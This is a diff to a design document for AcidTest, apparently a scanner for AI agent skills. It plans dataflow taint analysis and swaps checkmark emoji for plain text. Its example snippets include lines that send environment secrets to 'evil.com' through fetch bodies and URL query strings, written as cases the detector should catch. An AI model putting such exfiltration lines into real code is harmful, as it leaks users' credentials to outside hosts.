@@ -23,13 +23,13 @@ Unlike pattern matching (which detects individual suspicious operations), taint 
 ### 1.2 Why Does AcidTest Need It?
 
 AcidTest currently uses **pattern matching** (regex + AST traversal) to detect security issues. This catches direct threats like:
-- `eval(userInput)` ✅ Detected
-- `exec(process.env.SECRET)` ✅ Detected
+- `eval(userInput)` — detected
+- `exec(process.env.SECRET)` — detected
 
 But it **misses multi-step attacks**:
-- `const key = process.env.SECRET; fetch('evil.com', {body: key})` ❌ Missed
-- `const a = input; const b = a; exec(b)` ❌ Missed
-- `config.key = process.env.KEY; send(config.key)` ❌ Missed
+- `const key = process.env.SECRET; fetch('evil.com', {body: key})` — missed
+- `const a = input; const b = a; exec(b)` — missed
+- `config.key = process.env.KEY; send(config.key)` — missed
 
 These are real threats in AI agent code where credentials or sensitive data flow through multiple variables before exfiltration.
 
@@ -611,13 +611,13 @@ sink(z);
 
 ### 4.1 What WILL Be Implemented in v1.0.0
 
-✅ **Direct Taint Flow**
+**Direct Taint Flow**
 ```typescript
 const a = process.env.SECRET;  // SOURCE
 exec(a);                        // SINK → DETECTED
 ```
 
-✅ **Assignment Chains**
+**Assignment Chains**
 ```typescript
 const a = process.env.KEY;  // SOURCE
 const b = a;
@@ -625,28 +625,28 @@ const c = b;
 exec(c);                    // SINK → DETECTED (trace: KEY → a → b → c → exec)
 ```
 
-✅ **Property Assignment**
+**Property Assignment**
 ```typescript
 const config = {};
 config.apiKey = process.env.KEY;  // SOURCE
 fetch('evil.com', { body: config.apiKey });  // SINK → DETECTED
 ```
 
-✅ **Object Construction**
+**Object Construction**
 ```typescript
 const secret = process.env.TOKEN;
 const obj = { key: secret };
 send(obj.key);  // SINK → DETECTED
 ```
 
-✅ **Template Literals**
+**Template Literals**
 ```typescript
 const key = process.env.KEY;
 const url = `https://evil.com?key=${key}`;
 fetch(url);  // SINK → DETECTED
 ```
 
-✅ **Basic Function Arguments (Conservative)**
+**Basic Function Arguments (Conservative)**
 ```typescript
 const secret = process.env.KEY;
 function helper(param) {
@@ -655,16 +655,16 @@ function helper(param) {
 helper(secret);  // Propagate taint to param
 ```
 
-✅ **Single-File Analysis**
+**Single-File Analysis**
 - All taint analysis within one file
 - No cross-file imports tracked
 
-✅ **TypeScript/JavaScript Only**
+**TypeScript/JavaScript Only**
 - Python deferred to v1.1.0
 
 ### 4.2 What Will NOT Be Implemented (Future Work)
 
-❌ **Cross-File Analysis (v1.1.0+)**
+**Cross-File Analysis (v1.1.0+)**
 ```typescript
 // file1.ts
 export const secret = process.env.KEY;
@@ -674,7 +674,7 @@ import { secret } from './file1.js';
 exec(secret);  // NOT DETECTED in v1.0.0 (requires cross-file tracking)
 ```
 
-❌ **Complex Control Flow (v1.2.0+)**
+**Complex Control Flow (v1.2.0+)**
 ```typescript
 const key = process.env.KEY;
 if (someCondition) {
@@ -686,7 +686,7 @@ if (someCondition) {
 // v1.0.0: Will flag both (no control flow sensitivity)
 ```
 
-❌ **Return Value Propagation (v1.1.0+)**
+**Return Value Propagation (v1.1.0+)**
 ```typescript
 function getSecret() {
   return process.env.KEY;  // SOURCE
@@ -695,14 +695,14 @@ const key = getSecret();   // v1.0.0: key is NOT tracked as tainted
 exec(key);                 // NOT DETECTED (need interprocedural analysis)
 ```
 
-❌ **Async/Promise Chains (v1.2.0+)**
+**Async/Promise Chains (v1.2.0+)**
 ```typescript
 const response = await fetch('api.com');  // SOURCE: network response
 const data = await response.json();        // Taint propagation through promise
 exec(data);  // v1.0.0: May not track through async operations
 ```
 
-❌ **Array Operations (v1.1.0+)**
+**Array Operations (v1.1.0+)**
 ```typescript
 const arr = [];
 arr.push(process.env.KEY);   // Taint array
@@ -710,14 +710,14 @@ const leaked = arr[0];       // v1.0.0: leaked not tracked as tainted
 send(leaked);                // NOT DETECTED
 ```
 
-❌ **Spread Operators (v1.1.0+)**
+**Spread Operators (v1.1.0+)**
 ```typescript
 const tainted = { key: process.env.KEY };
 const copy = { ...tainted };  // v1.0.0: Spread not tracked
 send(copy.key);               // NOT DETECTED
 ```
 
-❌ **Sanitizers (v1.2.0+)**
+**Sanitizers (v1.2.0+)**
 ```typescript
 const key = process.env.KEY;
 const safe = validator.escape(key);  // Should remove taint
@@ -1293,15 +1293,15 @@ export async function scanDataflow(skill: Skill): Promise<LayerResult> {
 ```
 
 **Advantages**:
-- ✅ Clean separation from Layer 3 (different analysis technique)
-- ✅ Easy to disable/enable for testing (comment out layer 5)
-- ✅ Allows parallel development (doesn't modify Layer 3)
-- ✅ Clear extension path (Layer 3 = patterns, Layer 5 = dataflow)
-- ✅ Matches conceptual model (5 independent security layers)
+- Clean separation from Layer 3 (different analysis technique)
+- Easy to disable/enable for testing (comment out layer 5)
+- Allows parallel development (doesn't modify Layer 3)
+- Clear extension path (Layer 3 = patterns, Layer 5 = dataflow)
+- Matches conceptual model (5 independent security layers)
 
 **Disadvantages**:
-- ⚠️ Adds 5th layer (more complexity in scanner orchestration)
-- ⚠️ Some overlap with Layer 3 (both analyze code, but differently)
+- Adds 5th layer (more complexity in scanner orchestration)
+- Some overlap with Layer 3 (both analyze code, but differently)
 
 ### 8.3 Option B: Enhance Layer 3 (Code) — NOT RECOMMENDED
 
@@ -1329,15 +1329,15 @@ export async function scanCode(skill: Skill): Promise<LayerResult> {
 ```
 
 **Advantages**:
-- ✅ No new layer (keeps 4-layer architecture)
-- ✅ All code analysis in one place
+- No new layer (keeps 4-layer architecture)
+- All code analysis in one place
 
 **Disadvantages**:
-- ❌ Layer 3 becomes very complex (already 515 lines, would grow to 1000+)
-- ❌ Mixes two different analysis techniques (pattern-based vs. flow-sensitive)
-- ❌ Harder to test independently (tightly coupled)
-- ❌ Violates single-responsibility principle (Layer 3 does too much)
-- ❌ Harder to enable/disable dataflow analysis separately
+- Layer 3 becomes very complex (already 515 lines, would grow to 1000+)
+- Mixes two different analysis techniques (pattern-based vs. flow-sensitive)
+- Harder to test independently (tightly coupled)
+- Violates single-responsibility principle (Layer 3 does too much)
+- Harder to enable/disable dataflow analysis separately
 
 ### 8.4 Recommendation: Option A (New Layer 5)
 
@@ -1438,11 +1438,11 @@ export async function scanCode(skill: Skill): Promise<LayerResult> {
 
 | Tool | Scope | Speed | Setup | Agent-Specific |
 |------|-------|-------|-------|----------------|
-| CodeQL | Whole project | Slow (minutes) | Complex | ❌ No |
-| Semgrep | Multi-file | Fast (seconds) | Medium | ❌ No |
-| SonarQube | Whole project | Slow (minutes) | Complex | ❌ No |
-| DeepScan | Single file | Fast (seconds) | Medium | ❌ No |
-| **AcidTest** | **Single file** | **Fast (<4s)** | **Zero config** | **✅ Yes** |
+| CodeQL | Whole project | Slow (minutes) | Complex | No |
+| Semgrep | Multi-file | Fast (seconds) | Medium | No |
+| SonarQube | Whole project | Slow (minutes) | Complex | No |
+| DeepScan | Single file | Fast (seconds) | Medium | No |
+| **AcidTest** | **Single file** | **Fast (<4s)** | **Zero config** | **Yes** |
 
 **AcidTest's niche**:
 - **Pre-installation scanning**: Scan before installing AI agent skills/MCP servers
@@ -1551,31 +1551,31 @@ This checklist will guide the implementation in Phase 3. Total estimate: **10-20
 The dataflow analysis implementation (Phase 3) will be considered successful if:
 
 1. **Functionality**:
-   - ✅ Detects all 12 positive test cases (Test 1-12) with correct severity and path
-   - ✅ Does NOT flag negative test cases (Test 7, Test 10)
-   - ✅ Generates human-readable evidence strings showing full dataflow path
+   - Detects all 12 positive test cases (Test 1-12) with correct severity and path
+   - Does NOT flag negative test cases (Test 7, Test 10)
+   - Generates human-readable evidence strings showing full dataflow path
 
 2. **Performance**:
-   - ✅ Scan time < 4 seconds per skill (< 2x slowdown vs. v0.8.0)
-   - ✅ Handles large files (1000+ lines) in < 10 seconds
-   - ✅ Memory usage < 200MB per scan
+   - Scan time < 4 seconds per skill (< 2x slowdown vs. v0.8.0)
+   - Handles large files (1000+ lines) in < 10 seconds
+   - Memory usage < 200MB per scan
 
 3. **Integration**:
-   - ✅ Layer 5 integrates cleanly with existing scanner.ts
-   - ✅ Findings format matches existing Finding interface
-   - ✅ JSON output includes dataflow-specific fields (path, confidence)
+   - Layer 5 integrates cleanly with existing scanner.ts
+   - Findings format matches existing Finding interface
+   - JSON output includes dataflow-specific fields (path, confidence)
 
 4. **Code Quality**:
-   - ✅ Full TypeScript type safety (no `any` types)
-   - ✅ Unit tests for all core functions (80%+ coverage)
-   - ✅ JSDoc comments on all public APIs
-   - ✅ Follows existing AcidTest code style
+   - Full TypeScript type safety (no `any` types)
+   - Unit tests for all core functions (80%+ coverage)
+   - JSDoc comments on all public APIs
+   - Follows existing AcidTest code style
 
 5. **User Experience**:
-   - ✅ False positive rate < 15% (acceptable for v1.0.0)
-   - ✅ False negative rate < 20% (trade-off for simplicity)
-   - ✅ Findings include confidence level (high/medium/low)
-   - ✅ Evidence string clearly shows source → path → sink
+   - False positive rate < 15% (acceptable for v1.0.0)
+   - False negative rate < 20% (trade-off for simplicity)
+   - Findings include confidence level (high/medium/low)
+   - Evidence string clearly shows source → path → sink
 
 ---
 
